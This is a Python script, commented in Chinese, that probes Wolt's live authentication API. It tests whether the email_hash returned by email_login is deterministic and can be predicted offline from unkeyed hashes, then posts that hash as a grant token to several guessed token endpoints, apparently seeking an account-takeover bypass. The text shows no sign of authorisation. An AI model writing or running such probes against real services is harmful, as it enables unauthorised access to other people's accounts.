"""验证 email_login 的 email_hash 信任链：
1) 同一邮箱两次调用 -> hash 是否确定性
2) 常见哈希算法比对 -> hash 是否离线可预测（无密钥）
3) wauth2 token 端点是否接受 email_hash 直接换 token
"""
import sys, json, time, requests, hashlib, base64, hmac
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

EMAIL = "pccp85811746@web-library.net"
URL = "https://authentication.wolt.com/v3/users/email_login"

def call(email):
    r = requests.post(URL, json={"email": email}, timeout=10,
                      headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, r.text[:200]

# ===== 1. 确定性 =====
print("[1] same email twice:")
for i in range(2):
    st, j = call(EMAIL)
    print(f"  call{i}: {st} {j}")

# ===== 2. 可预测性：常见哈希 vs email_hash =====
# email_hash 是 URL-safe base64，22 字符 -> 16 字节
h = "DUDEHTsmbrMz4jypKWJ2QvLQqRK-NdVk9dwDMWvsYVU"
print(f"\n[2] target hash: {h}")
candidates = {}
for algo in ("md5", "sha1", "sha256", "sha512", "blake2b"):
    d = hashlib.new(algo, EMAIL.encode()).digest()
    for n in (16, 20, 24, 32):
        try:
            candidates[f"{algo}[:{n}]"] = base64.urlsafe_b64encode(d[:n]).decode().rstrip("=")
        except Exception:
            pass
# sha256 前16字节是常见设计
for name, v in candidates.items():
    mark = "  <<< MATCH" if v == h else ""
    print(f"  {name}: {v}{mark}")

# ===== 3. 不同邮箱 -> hash 是否不同（防止全局固定值）=====
print("\n[3] different email:")
st, j = call("someone.else.99999@web-library.net")
print(f"  {st} {j}")

# ===== 4. wauth2 token 端点：email_hash 当 grant token 提交 =====
# 从 JS 提取的登录 grant 结构
print("\n[4] wauth2 token endpoint probe:")
token_urls = [
    "https://authentication.wolt.com/wauth2/token",
    "https://authentication.wolt.com/wauth2/tokens",
    "https://authentication.wolt.com/v1/wauth2/token",
    "https://authentication.wolt.com/oauth2/token",
]
grant = {"grantType": "email_login", "token": h, "audience": "wolt-com"}
for u in token_urls:
    try:
        r = requests.post(u, json=grant, timeout=8,
                          headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        print(f"  POST {u} -> {r.status_code} {r.text[:200]}")
    except Exception as e:
        print(f"  POST {u} -> ERR {str(e)[:80]}")
